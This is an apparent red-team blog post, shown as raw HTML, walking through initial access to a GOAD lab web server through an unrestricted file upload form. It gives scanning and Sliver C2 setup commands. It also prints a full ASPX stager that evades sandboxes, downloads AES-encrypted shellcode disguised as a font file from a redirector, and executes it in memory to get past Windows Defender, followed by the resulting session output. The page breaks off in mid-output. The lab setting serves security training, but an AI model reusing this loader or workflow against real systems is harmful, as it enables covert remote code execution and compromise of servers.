<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>1. Gaining Initial Foothold | Red Mercury</title>
  <meta name="author" content="Mostafa Noureldin">
  
  <meta name="description" content="IntroductionIn this post we are building on the previous post 0. Basic Red Team Infrastructure. We are targeting initial access through an exposed file upload form.
Diagram


Players
Attacker machine: 192.168.25.128
Redirector machine: 192.168.25.138
Firewall: 192.168.24.138
Vicitm: GOAD Castelblack."> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="1. Gaining Initial Foothold"/>
  <meta property="og:site_name" content="Red Mercury"/>

  
    <meta property="og:image" content=""/>
  

  
  
  
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="https://mmnoureldin.github.io/Red-Team/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="https://mmnoureldin.github.io/Red-Team/">Red Mercury</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 1. Gaining Initial Foothold</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>In this post we are building on the previous post <a href="https://mmnoureldin.github.io/Red-Team/2023/02/01/Basic-Red-Team-Infrastructure/" title="0. Basic Red Team Infrastructure">0. Basic Red Team Infrastructure</a>. We are targeting initial access through an exposed file upload form.</p>
<h2 id="Diagram"><a href="#Diagram" class="headerlink" title="Diagram"></a>Diagram</h2><img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/Initial_access.png" class="">


<h2 id="Players"><a href="#Players" class="headerlink" title="Players"></a>Players</h2><ul>
<li>Attacker machine: 192.168.25.128</li>
<li>Redirector machine: 192.168.25.138</li>
<li>Firewall: 192.168.24.138</li>
<li>Vicitm: <a href="https://github.com/Orange-Cyberdefense/GOAD" title="" target="">GOAD Castelblack</a>.</li>
</ul>
<span id="more"></span>

<h2 id="Setup-firewall-rules"><a href="#Setup-firewall-rules" class="headerlink" title="Setup firewall rules"></a>Setup firewall rules</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flush all rules</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables  -F</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable routing masqurade</span></span><br><span class="line">iptables -t nat -A POSTROUTING -j MASQUERADE</span><br><span class="line"></span><br><span class="line"><span class="comment"># allow outgoing connections from GOAD to port 443 only</span></span><br><span class="line">iptables -A FORWARD -p tcp -s 192.168.24.0/24 --dport 443  -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -p tcp -d 192.168.24.0/24 --sport 443  -m conntrack --ctstate ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># allow incoming connections to SRV_02 on GOAD through port 80</span></span><br><span class="line">iptables -A FORWARD -p tcp -d 192.168.24.22 --dport 80 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -p tcp -s 192.168.24.22 --sport 80 -m conntrack --ctstate ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A FORWARD -j DROP</span><br></pre></td></tr></table></figure>

<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ ports=$(nmap -p- --min-rate=1000 -T4 192.168.24.0/24 --exclude 192.168.24.1,192.168.24.2,192.168.24.138 | grep ^[0-9] | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f 1 | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)                      130 ⨯</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">$ nmap -sC -sV -p<span class="variable">$ports</span> 192.168.24.0/24 --exclude 192.168.24.1,192.168.24.2,192.168.24.138                                                             </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-09 18:06 EST</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.24.22</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">| http-methods: </span></span><br><span class="line"><span class="string">|_  Potentially risky methods: TRACE</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-IIS/10.0</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 253 IP addresses (1 host up) scanned in 14.99 seconds</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<h3 id="RCE-through-file-upload"><a href="#RCE-through-file-upload" class="headerlink" title="RCE through file upload"></a>RCE through file upload</h3><ol>
<li>Surfing to <code>http://192.168.24.22</code>, we found a file upload form.</li>
</ol>
<img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230213153624960.png" class="">

<ol start="2">
<li>Following the upload link.</li>
</ol>
<img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230213153652929.png" class="">

<blockquote>
<p>Windows defender is enabled on the target.</p>
</blockquote>
<ol start="3">
<li><p>We have to upload an ASPX reverse shell that bypasses AV.</p>
</li>
<li><p>First, let’s luanch our C2 handler.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># We are using the redirector IP address for reverse shell.</span><br><span class="line">sliver &gt; profiles new --http  192.168.24.138 --skip-symbols --format shellcode --arch amd64 win64</span><br><span class="line"></span><br><span class="line">[*] Saved new implant profile win64</span><br><span class="line"></span><br><span class="line"># Staging should be encrypted and compressed.</span><br><span class="line"># We are using the host IP for staging, this will be handled by the redirection rules.</span><br><span class="line">sliver &gt; stage-listener --url https://192.168.25.128:8443 --profile win64  --compress gzip --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&amp;E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV</span><br><span class="line"></span><br><span class="line">[*] No builds found for profile win64, generating a new one</span><br><span class="line">[*] Job 1 (https) started</span><br><span class="line">[*] AES KEY: D(G+KbPeShVmYq3t6v9y$B&amp;E)H@McQfT</span><br><span class="line">[*] AES IV: 8y/B?E(G+KbPeShV</span><br><span class="line">sliver &gt; https</span><br><span class="line"></span><br><span class="line">[*] Starting HTTPS :443 listener ...</span><br><span class="line"></span><br><span class="line">[*] Successfully started job #2</span><br><span class="line"></span><br><span class="line">sliver &gt; jobs </span><br><span class="line"></span><br><span class="line"> ID   Name    Protocol   Port </span><br><span class="line">==== ======= ========== ======</span><br><span class="line"> 1    https   tcp        8443 </span><br><span class="line"> 2    https   tcp        443  </span><br></pre></td></tr></table></figure>
</li>
<li><p>Since, the target only allows outgoing connections to port 443, our redirector should listen on this port.</p>
</li>
<li><p>Upload the below ASPX stager.</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;C#&quot;</span> AutoEventWireup=<span class="string">&quot;true&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.IO&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.IO.Compression&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.Text&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.Net&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.Security.Cryptography&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.Security.Cryptography.X509Certificates&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;script runat=<span class="string">&quot;server&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Int32 MEM_COMMIT=<span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)<span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,<span class="keyword">ref</span> IntPtr lpThreadId</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">Sleep</span>(<span class="params"><span class="built_in">uint</span> dwMilliseconds</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, SetLastError = true, ExactSpelling = true)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAllocExNuma</span>(<span class="params">IntPtr hProcess, IntPtr lpAddress, <span class="built_in">uint</span> dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetCurrentProcess</span>()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">        DateTime t1 = <span class="keyword">new</span> DateTime();</span><br><span class="line">        Sleep(<span class="number">2000</span>);</span><br><span class="line">        Double t2 = DateTime.Now.Subtract(t1).TotalSeconds;</span><br><span class="line">        <span class="keyword">if</span> (t2 &lt; <span class="number">1.5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, <span class="number">0x1000</span>, <span class="number">0x3000</span>, <span class="number">0x4</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (mem == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="built_in">string</span> AESKey = <span class="string">&quot;D(G+KbPeShVmYq3t6v9y$B&amp;E)H@McQfT&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> AESIV = <span class="string">&quot;8y/B?E(G+KbPeShV&quot;</span>;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        ServicePointManager.Expect100Continue = <span class="literal">true</span>;</span><br><span class="line">        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;</span><br><span class="line">        ServicePointManager.CertificatePolicy = <span class="keyword">new</span> TrustAllCertsPolicy();</span><br><span class="line">        WebClient client = <span class="keyword">new</span> WebClient();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">byte</span>[] shellcode = client.DownloadData(<span class="string">&quot;https://192.168.24.138/test.woff&quot;</span>);</span><br><span class="line">        </span><br><span class="line">	List&lt;<span class="built_in">byte</span>&gt; l = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt; &#123; &#125;;   </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">16</span>; i &lt;= shellcode.Length <span class="number">-1</span>; i++) &#123;</span><br><span class="line">            l.Add(shellcode[i]);</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">       <span class="built_in">byte</span>[] actual = l.ToArray();</span><br><span class="line"></span><br><span class="line">       <span class="built_in">byte</span>[] decrypted;</span><br><span class="line"></span><br><span class="line">       decrypted = Decrypt(actual, AESKey, AESIV);</span><br><span class="line">        </span><br><span class="line">        IntPtr nDiIR7etNU = VirtualAlloc(IntPtr.Zero,(UIntPtr)decrypted.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">        System.Runtime.InteropServices.Marshal.Copy(decrypted,<span class="number">0</span>,nDiIR7etNU,decrypted.Length);</span><br><span class="line">        IntPtr dd8T1w6 = IntPtr.Zero;</span><br><span class="line">        IntPtr rFfyR = CreateThread(IntPtr.Zero,UIntPtr.Zero,nDiIR7etNU,IntPtr.Zero,<span class="number">0</span>,<span class="keyword">ref</span> dd8T1w6);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TrustAllCertsPolicy</span> : <span class="title">ICertificatePolicy</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">CheckValidationResult</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        ServicePoint srvPoint, X509Certificate certificate, WebRequest request, <span class="built_in">int</span> certificateProblem</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="built_in">byte</span>[] <span class="title">Decompress</span>(<span class="params"><span class="built_in">byte</span>[] bytes</span>)</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">using</span> (<span class="keyword">var</span> memoryStream = <span class="keyword">new</span> MemoryStream(bytes))</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (<span class="keyword">var</span> outputStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">using</span> (<span class="keyword">var</span> decompressStream = <span class="keyword">new</span> GZipStream(memoryStream, CompressionMode.Decompress))</span><br><span class="line">                    &#123;</span><br><span class="line">                        decompressStream.CopyTo(outputStream);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> outputStream.ToArray();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="built_in">byte</span>[] <span class="title">Decrypt</span>(<span class="params"><span class="built_in">byte</span>[] ciphertext, <span class="built_in">string</span> AESKey, <span class="built_in">string</span> AESIV</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] key = Encoding.UTF8.GetBytes(AESKey);</span><br><span class="line">            <span class="built_in">byte</span>[] IV = Encoding.UTF8.GetBytes(AESIV);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (Aes aesAlg = Aes.Create())</span><br><span class="line">            &#123;</span><br><span class="line">                aesAlg.Key = key;</span><br><span class="line">                aesAlg.IV = IV;</span><br><span class="line">                aesAlg.Padding = PaddingMode.None;</span><br><span class="line"></span><br><span class="line">                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream(ciphertext))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))</span><br><span class="line">                    &#123;</span><br><span class="line">                        cryptoStream.Write(ciphertext, <span class="number">0</span>, ciphertext.Length);</span><br><span class="line">                        <span class="keyword">return</span> Decompress(memoryStream.ToArray());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>


</li>
<li><p>Upload this file as <code>test.aspx</code>.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230213155120945.png" class="">

<img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230213155141959.png" class="">
</li>
<li><p>Now, we have to found where is this file locate don the target.</p>
</li>
<li><p>We can use <em>gobuster</em> to list target directories.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ gobuster <span class="built_in">dir</span> -u http://192.168.24.22 -w /usr/share/wordlists/dirb/common.txt -t 100                                                                                                      130 ⨯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.2.0-dev</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.24.22</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 100</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.2.0-dev</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/02/13 08:34:28 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/aspnet_client        (Status: 301) [Size: 158] [--&gt; http://192.168.24.22/aspnet_client/]</span><br><span class="line">/index.html           (Status: 200) [Size: 149]</span><br><span class="line">/upload               (Status: 301) [Size: 151] [--&gt; http://192.168.24.22/upload/]</span><br><span class="line">Progress: 4408 / 4615 (95.51%)===============================================================</span><br><span class="line">2023/02/13 08:34:30 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>


</li>
<li><p>There is an upload folder, so let’s surf to <code>http://192.168.24.22/upload/test.aspx</code>.</p>
</li>
<li><p>A few seconds later, we recieved a shell from the target.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; jobs </span><br><span class="line"></span><br><span class="line"> ID   Name    Protocol   Port </span><br><span class="line">==== ======= ========== ======</span><br><span class="line"> 2    https   tcp        443  </span><br><span class="line"> 4    https   tcp        8443 </span><br><span class="line"></span><br><span class="line">[*] Session 239944da BACK_BUG - tcp([::1]:35566)-&gt;192.168.24.22 (castelblack) - windows/amd64 - Mon, 13 Feb 2023 09:31:57 EST</span><br><span class="line"></span><br><span class="line">sliver &gt; sessions </span><br><span class="line"></span><br><span class="line"> ID         Name       Transport   Remote Address                    Hostname      Username   Operating System   Locale   Last Message                            Health  </span><br><span class="line">========== ========== =========== ================================= ============= ========== ================== ======== ======================================= =========</span><br><span class="line"> 239944da   BACK_BUG   http(s)     tcp([::1]:35566)-&gt;192.168.24.22   castelblack   &lt;err&gt;      windows/amd64      en-US    Mon Feb 13 09:33:08 EST 2023 (2s ago)   [ALIVE] </span><br><span class="line"></span><br><span class="line">sliver &gt; sessions -i 239944da</span><br><span class="line"></span><br><span class="line">[*] Active session BACK_BUG (239944da)</span><br><span class="line"></span><br><span class="line">sliver (BACK_BUG) &gt; whoami </span><br><span class="line"></span><br><span class="line">Logon ID: &lt;err&gt;</span><br><span class="line">[*] Current Token ID: IIS APPPOOL\DefaultAppPool</span><br><span class="line">sliver (BACK_BUG) &gt; info </span><br><span class="line"></span><br><span class="line">        Session ID: 239944da-46ad-4713-ba3d-752eeddd955d</span><br><span class="line">              Name: BACK_BUG</span><br><span class="line">          Hostname: castelblack</span><br><span class="line">              UUID: 15254d56-94dd-cb7a-7637-ca4b44270e75</span><br><span class="line">          Username: &lt;err&gt;</span><br><span class="line">               UID: &lt;err&gt;</span><br><span class="line">               GID: &lt;err&gt;</span><br><span class="line">               PID: 2732</span><br><span class="line">                OS: windows</span><br><span class="line">           Version: Server 2016 build 17763 x86_64</span><br><span class="line">            Locale: en-US</span><br><span class="line">              Arch: amd64</span><br><span class="line">         Active C2: 